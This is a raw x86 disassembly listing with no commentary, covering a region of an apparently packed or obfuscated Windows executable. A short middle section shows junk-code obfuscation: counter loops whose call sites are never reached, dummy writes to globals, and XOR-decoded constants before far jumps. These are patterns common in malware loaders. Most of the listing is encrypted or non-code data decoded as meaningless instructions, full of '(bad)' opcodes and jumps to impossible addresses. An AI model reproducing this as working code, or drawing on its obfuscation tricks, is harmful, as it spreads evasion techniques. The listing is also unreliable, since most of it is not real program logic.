  4079d1:	mov    ds:0xf4e30c8c,al
  4079d6:	adc    eax,DWORD PTR [ebx-0x3]
  4079d9:	push   ebp
  4079da:	sahf   
  4079db:	nop
  4079dc:	jge    0x4079ae
  4079de:	ins    DWORD PTR es:[edi],dx
  4079df:	xchg   edx,eax
  4079e0:	aad    0x91
  4079e2:	out    0x71,eax
  4079e4:	inc    eax
  4079e5:	jb     0x407a42
  4079e7:	aad    0x73
  4079e9:	fld    DWORD PTR [ecx]
  4079eb:	jle    0x407a51
  4079ed:	scas   al,BYTE PTR es:[edi]
  4079ee:	retf   
  4079ef:	inc    esp
  4079f0:	jg     0x407a45
  4079f2:	and    al,0x8f
  4079f4:	or     DWORD PTR [edx],ecx
  4079f6:	xlat   BYTE PTR ds:[ebx]
  4079f7:	cdq    
  4079f8:	push   esi
  4079f9:	popa   
  4079fa:	xchg   ebx,eax
  4079fb:	cmp    al,0x4c
  4079fd:	scas   eax,DWORD PTR es:[edi]
  4079fe:	xor    dl,0xa0
  407a01:	xchg   edi,eax
  407a02:	test   BYTE PTR [ebx+0x7255ee53],ch
  407a08:	dec    edx
  407a09:	jl     0x407a2d
  407a0b:	iret   
  407a0c:	std    
  407a0d:	pop    eax
  407a0e:	arpl   WORD PTR [esi+eiz*1-0x6ae0cd77],dx
  407a15:	push   ebx
  407a16:	test   BYTE PTR [ecx+ebx*8-0x58acb488],cl
  407a1d:	imul   edx,DWORD PTR [ebp+0xe4ee64],0x82fa118c
  407a27:	aaa    
  407a28:	sbb    al,0x24
  407a2a:	inc    eax
  407a2b:	push   DWORD PTR ds:0x43a38c
  407a31:	push   DWORD PTR ds:0x43a654
  407a37:	push   DWORD PTR [ebp-0x28]
  407a3a:	push   DWORD PTR [ebp-0x2c]
  407a3d:	mov    eax,DWORD PTR [ebp-0x14]
  407a40:	call   eax
  407a42:	mov    eax,DWORD PTR [ebp-0x30]
  407a45:	mov    ecx,DWORD PTR ds:0x43a350
  407a4b:	add    DWORD PTR [eax],ecx
  407a4d:	pop    edi
  407a4e:	pop    esi
  407a4f:	leave  
  407a50:	ret    
  407a51:	push   ebp
  407a52:	mov    ebp,esp
  407a54:	sub    esp,0x18
  407a57:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  407a5e:	lea    eax,[ebp+0x14]
  407a61:	adc    DWORD PTR ds:0x43501c,ecx
  407a67:	mov    DWORD PTR [ebp-0x4],eax
  407a6a:	adc    ecx,edx
  407a6c:	push   esi
  407a6d:	xor    ecx,0x4b84
  407a73:	mov    esi,0xf89c8585
  407a78:	xor    DWORD PTR ds:0x438014,edx
  407a7e:	mov    DWORD PTR [ebp-0xc],esi
  407a81:	lea    eax,[ebp-0xc]
  407a84:	adc    edx,ecx
  407a86:	mov    DWORD PTR [ebp-0x14],eax
  407a89:	mov    DWORD PTR ds:0x436014,0x1f
  407a93:	cmp    DWORD PTR ds:0x436014,0x0
  407a9a:	je     0x407ae5
  407aa0:	cmp    DWORD PTR ds:0x436014,0x6
  407aa7:	jg     0x407ae5
  407aad:	jmp    0x407abd
  407ab2:	push   0x43a097
  407ab7:	call   DWORD PTR ds:0x43a8d0
  407abd:	cmp    DWORD PTR ds:0x436014,0x7
  407ac4:	jne    0x407ad5
  407aca:	mov    eax,ds:0x436014
  407acf:	dec    eax
  407ad0:	mov    ds:0x436014,eax
  407ad5:	mov    eax,ds:0x436014
  407ada:	dec    eax
  407adb:	mov    ds:0x436014,eax
  407ae0:	jmp    0x407a93
  407ae5:	mov    eax,DWORD PTR [ebp-0xc]
  407ae8:	mov    edx,DWORD PTR [ebp-0x14]
  407aeb:	mov    ecx,0x751089b
  407af0:	xor    eax,ecx
  407af2:	add    eax,0x3272e2
  407af7:	adc    DWORD PTR ds:0x435010,0x438000
  407b01:	mov    DWORD PTR [edx],eax
  407b03:	sub    DWORD PTR ds:0x437008,0x436000
  407b0d:	mov    eax,ds:0x43a14c
  407b12:	sbb    DWORD PTR ds:0x43500c,ebx
  407b18:	mov    edx,DWORD PTR [ebp-0x4]
  407b1b:	or     DWORD PTR ds:0x435010,0x2376
  407b25:	mov    eax,DWORD PTR [eax]
  407b27:	add    DWORD PTR ds:0x434010,0x435010
  407b31:	add    eax,DWORD PTR [edx]
  407b33:	push   edi
  407b34:	mov    DWORD PTR [ebp-0x8],eax
  407b37:	mov    edi,DWORD PTR [ebp+0x8]
  407b3a:	and    DWORD PTR ds:0x438004,0x0
  407b44:	xor    edx,edx
  407b46:	xor    edx,DWORD PTR ds:0x438004
  407b4c:	inc    edx
  407b4d:	mov    DWORD PTR ds:0x438004,edx
  407b53:	cmp    DWORD PTR ds:0x438004,0x20
  407b5a:	jle    0x407b7d
  407b60:	jmp    0x407b70
  407b65:	push   0x43a111
  407b6a:	call   DWORD PTR ds:0x43a8d4
  407b70:	cmp    DWORD PTR ds:0x438004,0x11
  407b77:	jb     0x407b44
  407b7d:	mov    eax,ds:0x43a2d4
  407b82:	mov    eax,DWORD PTR [eax+0x198]
  407b88:	adc    DWORD PTR ds:0x43501c,0x6968
  407b92:	xor    edi,ecx
  407b94:	mov    edx,0x3272e2
  407b99:	add    edi,edx
  407b9b:	mov    DWORD PTR ds:0x434028,0x7d8d
  407ba5:	cmp    DWORD PTR [eax],edi
  407ba7:	mov    DWORD PTR ds:0x43500c,0x2ed0
  407bb1:	je     0x407bd2
  407bb7:	mov    DWORD PTR ds:0x43401c,0x771b
  407bc1:	mov    eax,DWORD PTR [eax]
  407bc3:	mov    DWORD PTR ds:0x434028,0x1ca1
  407bcd:	jmp    0x40a3ac
  407bd2:	mov    eax,DWORD PTR [ebp+0x18]
  407bd5:	cmp    eax,esi
  407bd7:	jne    0x407bf1
  407bdd:	mov    DWORD PTR ds:0x437010,0x6440
  407be7:	push   0xf89c8584
  407bec:	jmp    0x40a39b
  407bf1:	mov    esi,DWORD PTR [ebp+0x18]
  407bf4:	mov    eax,0xf89c85bb
  407bf9:	cmp    esi,eax
  407bfb:	jne    0x40a38b
  407c01:	sub    eax,esi
  407c03:	mov    eax,DWORD PTR [ebp+0x10]
  407c06:	xor    eax,ecx
  407c08:	mov    DWORD PTR ds:0x437008,0x10
  407c12:	cmp    DWORD PTR ds:0x437008,0x0
  407c19:	je     0x407c4c
  407c1f:	cmp    DWORD PTR ds:0x437008,0x12
  407c26:	jl     0x407c4c
  407c2c:	jmp    0x407c3a
  407c31:	push   DWORD PTR [ebp-0x18]
  407c34:	call   DWORD PTR ds:0x43a8dc
  407c3a:	mov    esi,DWORD PTR ds:0x437008
  407c40:	dec    esi
  407c41:	mov    DWORD PTR ds:0x437008,esi
  407c47:	jmp    0x407c12
  407c4c:	add    eax,edx
  407c4e:	and    DWORD PTR ds:0x43501c,0x0
  407c58:	jmp    0x407c6c
  407c5d:	xor    esi,esi
  407c5f:	or     esi,DWORD PTR ds:0x43501c
  407c65:	inc    esi
  407c66:	mov    DWORD PTR ds:0x43501c,esi
  407c6c:	cmp    DWORD PTR ds:0x43501c,0x1f
  407c73:	jae    0x407cc0
  407c79:	cmp    DWORD PTR ds:0x43501c,0x12
  407c80:	jg     0x407cc0
  407c86:	jmp    0x407ca1
  407c8b:	push   0x43a0c9
  407c90:	push   0x779d
  407c95:	push   DWORD PTR [ebp-0x18]
  407c98:	push   DWORD PTR [ebp-0x18]
  407c9b:	call   DWORD PTR ds:0x43a8e0
  407ca1:	cmp    DWORD PTR ds:0x43501c,0x11
  407ca8:	jne    0x407cbb
  407cae:	mov    esi,DWORD PTR ds:0x43501c
  407cb4:	inc    esi
  407cb5:	mov    DWORD PTR ds:0x43501c,esi
  407cbb:	jmp    0x407c5d
  407cc0:	mov    DWORD PTR [ebp-0x18],eax
  407cc3:	and    esi,esi
  407cc5:	mov    eax,DWORD PTR [ebp+0xc]
  407cc8:	mov    esi,DWORD PTR ds:0x437010
  407cce:	or     DWORD PTR ds:0x43600c,esi
  407cd4:	mov    esi,DWORD PTR [ebp-0x8]
  407cd7:	adc    DWORD PTR ds:0x43401c,0x438010
  407ce1:	xor    eax,ecx
  407ce3:	adc    DWORD PTR ds:0x435004,0x436008
  407ced:	add    eax,edx
  407cef:	xor    DWORD PTR ds:0x43501c,0x437018
  407cf9:	imul   eax,DWORD PTR [esi]
  407cfc:	mov    esi,DWORD PTR [ebp+0x8]
  407cff:	and    DWORD PTR ds:0x43700c,0x3cde
  407d09:	xor    esi,ecx
  407d0b:	sbb    DWORD PTR ds:0x437000,0x2ed1
  407d15:	add    esi,edx
  407d17:	mov    DWORD PTR ds:0x436004,0x2911
  407d21:	cmp    esi,eax
  407d23:	mov    eax,DWORD PTR [ebp-0x4]
  407d26:	mov    DWORD PTR ds:0x43501c,0x4044
  407d30:	push   ebx
  407d31:	mov    DWORD PTR ds:0x43600c,0x6dfa
  407d3b:	je     0x407e07
  407d41:	mov    DWORD PTR ds:0x435018,0x18
  407d4b:	cmp    DWORD PTR ds:0x435018,0x0
  407d52:	je     0x407db4
  407d58:	cmp    DWORD PTR ds:0x435018,0x8
  407d5f:	jb     0x407db4
  407d65:	jmp    0x407d88
  407d6a:	push   0x2a76
  407d6f:	push   0x436018
  407d74:	push   DWORD PTR [ebp-0xc]
  407d77:	push   0x43a01f
  407d7c:	push   DWORD PTR [ebp-0x24]
  407d7f:	push   DWORD PTR [ebp-0x24]
  407d82:	call   DWORD PTR ds:0x43a8e4
  407d88:	cmp    DWORD PTR ds:0x435018,0x9
  407d8f:	jne    0x407da2
  407d95:	mov    esi,DWORD PTR ds:0x435018
  407d9b:	dec    esi
  407d9c:	mov    DWORD PTR ds:0x435018,esi
  407da2:	mov    esi,DWORD PTR ds:0x435018
  407da8:	dec    esi
  407da9:	mov    DWORD PTR ds:0x435018,esi
  407daf:	jmp    0x407d4b
  407db4:	mov    esi,DWORD PTR [ebp-0x18]
  407db7:	add    DWORD PTR [eax],esi
  407db9:	mov    eax,DWORD PTR [ebp-0x4]
  407dbc:	mov    esi,DWORD PTR ds:0x43700c
  407dc2:	xor    esi,DWORD PTR ds:0x434008
  407dc8:	mov    DWORD PTR ds:0x43700c,esi
  407dce:	mov    esi,DWORD PTR [ebp+0xc]
  407dd1:	and    DWORD PTR ds:0x436010,0x434018
  407ddb:	xor    esi,ecx
  407ddd:	add    DWORD PTR ds:0x435018,0x43600c
  407de7:	add    esi,edx
  407de9:	xor    DWORD PTR ds:0x437014,0x43801c
  407df3:	imul   esi,DWORD PTR [eax]
  407df6:	mov    DWORD PTR ds:0x436018,0x6d68
  407e00:	mov    DWORD PTR [eax],esi
  407e02:	jmp    0x407e77
  407e07:	mov    DWORD PTR ds:0x435014,0x11
  407e11:	cmp    DWORD PTR ds:0x435014,0x0
  407e18:	je     0x407e72
  407e1e:	cmp    DWORD PTR ds:0x435014,0x6
  407e25:	ja     0x407e72
  407e2b:	jmp    0x407e46
  407e30:	push   DWORD PTR [ebp-0xc]
  407e33:	push   0x2134
  407e38:	push   DWORD PTR [ebp-0x24]
  407e3b:	push   0x8f99
  407e40:	call   DWORD PTR ds:0x43a8e8
  407e46:	cmp    DWORD PTR ds:0x435014,0x7
  407e4d:	jne    0x407e60
  407e53:	mov    ebx,DWORD PTR ds:0x435014
  407e59:	dec    ebx
  407e5a:	mov    DWORD PTR ds:0x435014,ebx
  407e60:	mov    ebx,DWORD PTR ds:0x435014
  407e66:	dec    ebx
  407e67:	mov    DWORD PTR ds:0x435014,ebx
  407e6d:	jmp    0x407e11
  407e72:	mov    esi,DWORD PTR [ebp+0x14]
  407e75:	xor    DWORD PTR [eax],esi
  407e77:	mov    eax,DWORD PTR [ebp-0x4]
  407e7a:	mov    edi,DWORD PTR [ebp+0x10]
  407e7d:	xor    edi,ecx
  407e7f:	mov    esi,0xffcd8d1e
  407e84:	mov    ebx,esi
  407e86:	sub    ebx,edi
  407e88:	add    DWORD PTR [eax],ebx
  407e8a:	mov    eax,DWORD PTR [ebp-0x4]
  407e8d:	mov    edi,DWORD PTR [ebp-0x8]
  407e90:	add    edi,DWORD PTR [eax]
  407e92:	mov    DWORD PTR [ebp-0x8],edi
  407e95:	mov    eax,DWORD PTR [ebp+0xc]
  407e98:	mov    edi,DWORD PTR [ebp+0xc]
  407e9b:	xor    edi,ecx
  407e9d:	xor    eax,ecx
  407e9f:	jmp    0x40a259
  407ea4:	lahf   
  407ea5:	(bad)  
  407ea6:	xchg   esp,eax
  407ea7:	jle    0x407e3d
  407ea9:	emms   
  407eab:	xchg   DWORD PTR [edi],ebp
  407ead:	jmp    0x5fcb:0x91cc670
  407eb4:	test   eax,0xd17c7c3a
  407eb9:	pop    edi
  407eba:	jl     0x407f38
  407ebc:	dec    esi
  407ebd:	mov    esi,0x744f6a92
  407ec2:	adc    DWORD PTR es:[eax],0x7
  407ec6:	mov    ds:0xddd115f5,eax
  407ecb:	jns    0x407efa
  407ecd:	inc    ecx
  407ece:	adc    BYTE PTR [edi+edx*4],cl
  407ed1:	inc    edi
  407ed2:	sub    ah,ah
  407ed4:	cli    
  407ed5:	scas   al,BYTE PTR es:[edi]
  407ed6:	push   ds
  407ed7:	mov    ebp,0xd4cf1cea
  407edc:	mov    edi,0x72fd6605
  407ee1:	sahf   
  407ee2:	inc    ebx
  407ee3:	leave  
  407ee4:	jp     0x407ee7
  407ee6:	xlat   BYTE PTR ds:[ebx]
  407ee7:	out    0xfc,al
  407ee9:	inc    esp
  407eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eeb:	mul    DWORD PTR [esi-0x1e]
  407eee:	(bad)  [edx-0x1b]
  407ef1:	rol    DWORD PTR [eax],0x6a
  407ef4:	jnp    0x407ec8
  407ef6:	pop    ss
  407ef7:	mov    ebx,0x57d5b07e
  407efc:	mov    edx,0xeaa83c40
  407f01:	je     0x407f24
  407f03:	mov    DWORD PTR [esi],edi
  407f05:	and    BYTE PTR [edx-0x3],ch
  407f08:	xor    DWORD PTR [ebx+0x7c],eax
  407f0b:	(bad)  
  407f0c:	enter  0xae0d,0x51
  407f10:	fcomp  DWORD PTR [ecx+0x4f]
  407f13:	xchg   ebx,eax
  407f14:	inc    ebp
  407f15:	imul   eax,DWORD PTR [eax],0x921fe2b5
  407f1b:	fsubr  DWORD PTR [esi+0x79a319d5]
  407f21:	rol    eax,0xcd
  407f24:	in     eax,dx
  407f25:	(bad)  
  407f26:	xchg   DWORD PTR [ebp+0x1c28e002],ecx
  407f2c:	sub    al,0x6d
  407f2e:	mov    edi,0x91770dd
  407f33:	push   esi
  407f34:	bnd jno 0x407fa5
  407f37:	inc    eax
  407f38:	popa   
  407f39:	sub    ah,BYTE PTR [edi]
  407f3b:	or     al,0x32
  407f3d:	dec    edx
  407f3e:	jg     0x407fb0
  407f40:	popf   
  407f41:	retf   
  407f42:	(bad)  
  407f43:	cmp    BYTE PTR [edi+0x11],bl
  407f46:	in     al,0x3
  407f48:	popf   
  407f49:	cld    
  407f4a:	test   bh,0xa0
  407f4d:	xchg   DWORD PTR [edx-0x79b63b54],ebp
  407f53:	stos   BYTE PTR es:[edi],al
  407f54:	adc    esi,0x6
  407f57:	scas   eax,DWORD PTR es:[edi]
  407f58:	pop    ss
  407f59:	call   0xb5c0c891
  407f5e:	imul   edx,DWORD PTR [eax],0x8e9665e7
  407f64:	gs jmp 0x407fb8
  407f67:	fwait
  407f68:	mov    ecx,0xc1458377
  407f6d:	in     eax,0x64
  407f6f:	jns    0x407f3c
  407f71:	cmp    dh,al
  407f73:	in     al,dx
  407f74:	cs pop edi
  407f76:	lods   eax,DWORD PTR ds:[esi]
  407f77:	mov    esp,0xae9dc0ca
  407f7c:	or     bl,BYTE PTR [edi+0x62dad9b5]
  407f82:	out    dx,al
  407f83:	bound  edi,QWORD PTR [eax+0x38]
  407f86:	adc    al,0x84
  407f88:	ss adc bh,ch
  407f8b:	adc    eax,0x456b6545
  407f90:	xchg   edx,eax
  407f91:	aaa    
  407f92:	push   esi
  407f93:	pop    ds
  407f94:	(bad)  
  407f95:	fwait
  407f96:	mov    WORD PTR ss:[edi+0x40],es
  407f9a:	jecxz  0x407f2f
  407f9c:	inc    edi
  407f9d:	mov    dl,0x25
  407f9f:	retf   
  407fa0:	mov    ah,0x5a
  407fa2:	cmp    BYTE PTR [ecx-0x7e],0x32
  407fa6:	adc    BYTE PTR [ecx+0x4aa11e95],0x23
  407fad:	loop   0x408002
  407faf:	daa    
  407fb0:	shr    cl,1
  407fb2:	addr16 in eax,0x3d
  407fb5:	sub    dh,BYTE PTR [ecx+0x570d02e0]
  407fbb:	xor    bh,0x7e
  407fbe:	mov    esi,0x4a3cea5b
  407fc3:	(bad)  
  407fc4:	retf   
  407fc5:	mov    ds,WORD PTR [edx]
  407fc7:	sub    eax,0xa7c0967d
  407fcc:	sub    ebx,DWORD PTR [ecx+0x60a4511a]
  407fd2:	mov    esi,0x71b29953
  407fd7:	fs inc ebx
  407fd9:	mov    esp,0x7d4367f0
  407fde:	cmp    esp,ecx
  407fe0:	aad    0x31
  407fe2:	out    dx,al
  407fe3:	adc    edi,DWORD PTR [esi]
  407fe5:	pop    esp
  407fe6:	xor    al,0xe4
  407fe8:	add    DWORD PTR [esi+0x13],edi
  407feb:	mov    ebp,0x464de198
  407ff0:	add    bh,BYTE PTR [esp+ecx*1]
  407ff3:	pop    ds
  407ff4:	ja     0x40804e
  407ff6:	sub    eax,0x24f78327
  407ffb:	cwde   
  407ffc:	jmp    0x77cf:0x7706ce6c
  408003:	adc    cl,BYTE PTR [ebx]
  408005:	cs (bad) 
  408008:	add    BYTE PTR [edx],dh
  40800a:	mov    bh,0x61
  40800c:	loop   0x407fd2
  40800e:	mov    cl,0xfd
  408010:	test   BYTE PTR [eax+0x134d3d22],al
  408016:	sbb    cl,BYTE PTR [edx+0x53244b88]
  40801c:	sti    
  40801d:	aaa    
  40801e:	lahf   
  40801f:	icebp  
  408020:	popa   
  408021:	push   esp
  408022:	imul   ebx,DWORD PTR [esi+0x34],0xffffffc6
  408026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408027:	adc    al,0xec
  408029:	(bad)
  40802d:	fdivr  st(5),st
  40802f:	jnp    0x40808d
  408031:	or     edi,edx
  408033:	cmp    BYTE PTR [ebp-0x49],ch
  408036:	xor    al,0x93
  408038:	pop    ss
  408039:	fldcw  WORD PTR [ebx]
  40803b:	test   eax,0x25b1155a
  408040:	pop    es
  408041:	iret   
  408042:	pop    eax
  408043:	jp     0x407ff4
  408045:	test   BYTE PTR gs:[eax+0x7b09d039],dl
  40804c:	jp     0x4080cb
  40804e:	mov    ds,ebp
  408050:	pop    eax
  408051:	fidiv  DWORD PTR [edx+0x2226782]
  408057:	mov    cl,0x3
  408059:	leave  
  40805a:	dec    esp
  40805b:	pusha  
  40805c:	pop    es
  40805d:	push   edx
  40805e:	ss pop es
  408060:	add    BYTE PTR [edi-0x26ba27f5],0x9e
  408067:	fnstsw WORD PTR [esi+0x420c71ea]
  40806d:	sub    ecx,DWORD PTR [esi-0x55]
  408070:	(bad)  
  408071:	div    eax
  408073:	sahf   
  408074:	or     BYTE PTR [ebx+0x45c1fd74],ch
  40807a:	int3   
  40807b:	mov    DWORD PTR [ebx+0x76cf60f8],eax
  408081:	sahf   
  408082:	cld    
  408083:	dec    esi
  408084:	(bad)  
  408085:	pop    ebp
  408086:	aad    0x9
  408088:	call   0xd7f8ba09
  40808d:	shl    DWORD PTR [ecx-0x78ffd4fb],0x6
  408094:	in     eax,0x20
  408096:	push   ecx
  408097:	push   ds
  408098:	xchg   ecx,eax
  408099:	lahf   
  40809a:	cmc    
  40809b:	fsubrp st(2),st
  40809d:	(bad)  
  40809e:	and    DWORD PTR [ebx+0x75],ebx
  4080a1:	out    dx,eax
  4080a2:	jp     0x408090
  4080a4:	xor    BYTE PTR [ebx+0x3aba88d0],dh
  4080aa:	cmp    BYTE PTR [edi+0x4a],ch
  4080ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ae:	and    al,0x5a
  4080b0:	push   edx
  4080b1:	pop    edx
  4080b2:	dec    ebx
  4080b3:	int    0xac
  4080b5:	mov    esi,0xbd1d4f6d
  4080ba:	ror    DWORD PTR [esi-0x3b245b18],cl
  4080c0:	scas   eax,DWORD PTR es:[edi]
  4080c1:	ins    BYTE PTR es:[edi],dx
  4080c2:	jmp    0xb1df9031
  4080c7:	jle    0x40804d
  4080c9:	nop    DWORD PTR [ecx+0x7b0a8b0d]
  4080d0:	xchg   bl,bh
  4080d2:	lods   al,BYTE PTR ds:[esi]
  4080d3:	mov    ah,0xae
  4080d5:	jle    0x408091
  4080d7:	outs   dx,BYTE PTR ds:[esi]
  4080d8:	lods   al,BYTE PTR ds:[esi]
  4080d9:	clc    
  4080da:	idiv   ebp
  4080dc:	mov    ecx,0x847adf01
  4080e1:	out    0x1,eax
  4080e3:	int    0x7b
  4080e5:	std    
  4080e6:	cmp    eax,0x456829dd
  4080eb:	inc    esi
  4080ec:	daa    
  4080ed:	or     DWORD PTR [ebx-0x7a],eax
  4080f0:	pop    esi
  4080f1:	adc    DWORD PTR [ecx],edi
  4080f3:	add    al,0xe3
  4080f5:	das    
  4080f6:	mov    DWORD PTR [ecx+0x686bd4f1],ebp
  4080fc:	retf   0xe361
  4080ff:	ins    BYTE PTR es:[edi],dx
  408100:	push   esp
  408101:	outs   dx,DWORD PTR ds:[esi]
  408102:	dec    esi
  408103:	adc    eax,0x3bf1b77f
  408108:	mov    al,0x5
  40810a:	dec    ebp
  40810b:	dec    edi
  40810c:	daa    
  40810d:	mov    ebp,0xd6e52263
  408112:	pop    edx
  408113:	mov    ch,0x19
  408115:	outs   dx,BYTE PTR ds:[esi]
  408116:	xor    ebx,DWORD PTR [ebp-0x3e25de1d]
  40811c:	xchg   esp,eax
  40811d:	pop    esi
  40811e:	imul   ecx,edi,0x52da7724
  408124:	lahf   
  408125:	(bad)  
  408126:	std    
  408127:	mov    bl,0x82
  408129:	xchg   BYTE PTR [edi+eax*2+0x19726944],bl
  408130:	bnd jle 0x4081a3
  408133:	loope  0x4080f8
  408135:	jmp    0x408121
  408137:	sbb    eax,0x9a74b67d
  40813c:	int3   
  40813d:	jne    0x4081ab
  40813f:	and    DWORD PTR [ebx+0x48],esi
  408142:	sbb    ebp,DWORD PTR [esp+ebp*4]
  408145:	dec    edi
  408146:	daa    
  408147:	sub    dh,dh
  408149:	sub    ebp,DWORD PTR [eax+edx*1-0x2230986b]
  408150:	dec    edi
  408151:	mov    ebx,0x902f5710
  408156:	mov    dh,0xda
  408158:	(bad)  
  408159:	jp     0x4080f6
  40815b:	push   esp
  40815c:	xchg   bl,ch
  40815e:	xchg   DWORD PTR [esi],ecx
  408160:	add    ecx,ebx
  408162:	cmp    BYTE PTR [ebp+0x16],bh
  408165:	push   ecx
  408166:	arpl   WORD PTR [ecx+0x5baf1b8c],si
  40816c:	je     0x40817c
  40816e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40816f:	sub    ch,BYTE PTR [esi-0x5b]
  408172:	xor    al,0x4f
  408174:	icebp  
  408175:	or     dh,BYTE PTR [eax]
  408177:	cmp    DWORD PTR [eax+0x79],edi
  40817a:	test   BYTE PTR [eax+eiz*8+0x6a68b2d9],cl
  408181:	ins    DWORD PTR es:[edi],dx
  408182:	jns    0x408124
  408184:	cdq    
  408185:	xor    al,0x46
  408187:	bnd jmp DWORD PTR [ebp-0x2a3ee6c5]
  40818e:	ret    
  40818f:	lea    eax,[edi+0x36]
  408192:	sbb    eax,DWORD PTR [eax+0x6a]
  408195:	int3   
  408196:	outs   dx,DWORD PTR ds:[esi]
  408197:	inc    edi
  408198:	ins    DWORD PTR es:[edi],dx
  408199:	repz adc ecx,DWORD PTR [eax]
  40819c:	add    al,0x9a
  40819e:	aam    0x32
  4081a0:	sbb    eax,0x4d661a16
  4081a5:	push   ebp
  4081a6:	mov    cl,0x96
  4081a8:	mov    eax,ds:0xff3c1390
  4081ad:	int3   
  4081ae:	or     esp,ebp
  4081b0:	jo     0x408195
  4081b2:	in     eax,dx
  4081b3:	out    dx,al
  4081b4:	fisub  DWORD PTR [ebp*2-0x4535b4ce]
  4081bb:	mov    al,0xe0
  4081bd:	loopne 0x408239
  4081bf:	mov    ds,esp
  4081c1:	push   eax
  4081c2:	xor    ch,bh
  4081c4:	mov    cl,0xc6
  4081c6:	jmp    0x4081c4
  4081c8:	ss cs stc 
  4081cb:	(bad)  
  4081cc:	inc    ebx
  4081cd:	popf   
  4081ce:	sub    eax,0x1a65eca1
  4081d3:	in     al,dx
  4081d4:	inc    BYTE PTR [esi-0x2df339fb]
  4081da:	clc    
  4081db:	hlt    
  4081dc:	repnz and ecx,DWORD PTR [edi+0x47bfb6c4]
  4081e3:	cmp    esi,eax
  4081e5:	leave  
  4081e6:	jp     0x408184
  4081e8:	add    esi,DWORD PTR [eax+0x1a92ffb]
  4081ee:	cmp    eax,0x35f8864c
  4081f3:	pop    ebp
  4081f4:	lods   eax,DWORD PTR ds:[esi]
  4081f5:	dec    edi
  4081f6:	dec    esi
  4081f7:	cwde   
  4081f8:	repnz mov edx,0x4903ac16
  4081fe:	adc    al,0x4d
  408200:	pop    ecx
  408201:	enter  0x766,0x3
  408205:	aad    0x71
  408207:	int    0x96
  408209:	les    esp,FWORD PTR [ebx-0x7764bb03]
  40820f:	sub    bl,ch
  408211:	rol    DWORD PTR [ebp+0x75],cl
  408214:	and    eax,0x207a787e
  408219:	sbb    esp,ecx
  40821b:	or     DWORD PTR [eax-0x8],ecx
  40821e:	mov    ds:0x227203c0,eax
  408223:	sgdtd  [edi]
  408226:	lock push 0x7e821c75
  40822c:	dec    ch
  40822e:	sbb    eax,0x37e6a59e
  408233:	xchg   DWORD PTR [ecx],ebp
  408235:	adc    esi,DWORD PTR [esi+0x31a5d58f]
  40823b:	cdq    
  40823c:	ss inc esi
  40823e:	test   eax,0xd518a5ff
  408243:	popf   
  408244:	or     bl,BYTE PTR [ebx-0x574822b1]
  40824a:	(bad)  
  40824c:	jle    0x40826a
  40824e:	jne    0x40823d
  408250:	cdq    
  408251:	scas   al,BYTE PTR es:[edi]
  408252:	in     eax,0xc1
  408254:	pop    edi
  408255:	mov    esi,0x8383348f
  40825a:	fdiv   st(4),st
  40825c:	add    ecx,DWORD PTR [ecx+edx*4-0x64cf466b]
  408263:	fst    QWORD PTR [ebp+0x60f355e4]
  408269:	jmp    0x91d6:0xbaec0f98
  408270:	das    
  408271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408272:	iret   
  408273:	sub    bl,BYTE PTR [edi]
  408275:	add    bl,BYTE PTR [edx+esi*1]
  408278:	das    
  408279:	jg     0x4082af
  40827b:	lea    ebp,[ebx+0x13d3e712]
  408281:	sub    eax,0x98741317
  408286:	adc    ah,al
  408288:	imul   edx,DWORD PTR ds:0x26153777,0x7f
  40828f:	inc    ecx
  408290:	mov    cl,0x6c
  408292:	aad    0x14
  408294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408295:	clc    
  408296:	or     BYTE PTR [esi+edx*1-0x188ee705],0x5b
  40829e:	inc    ecx
  40829f:	add    edi,DWORD PTR [eax]
  4082a1:	in     eax,dx
  4082a2:	icebp  
  4082a3:	pop    esi
  4082a4:	data16 and BYTE PTR [ecx+0x24],bh
  4082a8:	jp     0x4082c0
  4082aa:	cmc    
  4082ab:	enter  0xc4ea,0x96
  4082af:	sub    al,0xe4
  4082b1:	stos   DWORD PTR es:[edi],eax
  4082b2:	test   eax,0x25c3f773
  4082b7:	pop    ds
  4082b8:	push   ecx
  4082b9:	ret    
  4082ba:	(bad)  
  4082bb:	loopne 0x4082f8
  4082bd:	in     al,0x2b
  4082bf:	lahf   
  4082c0:	mov    ds:0x1a428705,al
  4082c5:	push   ds
  4082c6:	nop
  4082c7:	hlt    
  4082c8:	retf   
  4082c9:	(bad)  
  4082ca:	mov    eax,0xaab61570
  4082cf:	sbb    ecx,esp
  4082d1:	sbb    dl,BYTE PTR [ebp+ebp*8+0x21e17a48]
  4082d8:	push   ecx
  4082d9:	adc    eax,0xe3f28fd5
  4082de:	xlat   BYTE PTR ds:[ebx]
  4082df:	loope  0x408304
  4082e1:	xlat   BYTE PTR ds:[ebx]
  4082e2:	lods   eax,DWORD PTR ds:[esi]
  4082e3:	push   0x3b
  4082e5:	mov    dh,0x82
  4082e7:	ins    DWORD PTR es:[edi],dx
  4082e8:	pop    eax
  4082e9:	das    
  4082ea:	xor    dl,0xad
  4082ed:	nop
  4082ee:	xor    eax,0x2cd2baa7
  4082f3:	jmp    0x4082f3
  4082f5:	pusha  
  4082f6:	sub    BYTE PTR [ebx+0x48],cl
  4082f9:	arpl   WORD PTR [esi+0x1839a746],bp
  4082ff:	dec    esp
  408300:	mov    esp,0x440cef33
  408305:	cmc    
  408306:	mov    ds:0xbb98d92a,eax
  40830b:	sbb    eax,0x2d920f29
  408310:	scas   al,BYTE PTR es:[edi]
  408311:	mov    bl,0x26
  408313:	pop    esi
  408314:	pop    DWORD PTR [esi-0x36145fbc]
  40831a:	adc    bl,BYTE PTR [eax-0x67db57fc]
  408320:	cmp    DWORD PTR [edx-0x61],esi
  408323:	imul   edi,eax,0xffffffcc
  408326:	dec    DWORD PTR [ebx-0x53d1ad1b]
  40832c:	push   es
  40832d:	pop    eax
  40832e:	push   edx
  40832f:	(bad)  
  408331:	sub    edi,DWORD PTR [eax+0x6802bb63]
  408337:	push   ebp
  408338:	out    dx,al
  408339:	add    al,0x17
  40833b:	rcl    DWORD PTR [esi],cl
  40833d:	fild   DWORD PTR [ebp+0x32ea3e7d]
  408343:	pop    es
  408344:	icebp  
  408345:	and    ebx,esp
  408347:	sub    eax,0x4f073ced
  40834c:	dec    ebx
  40834d:	outs   dx,BYTE PTR ds:[esi]
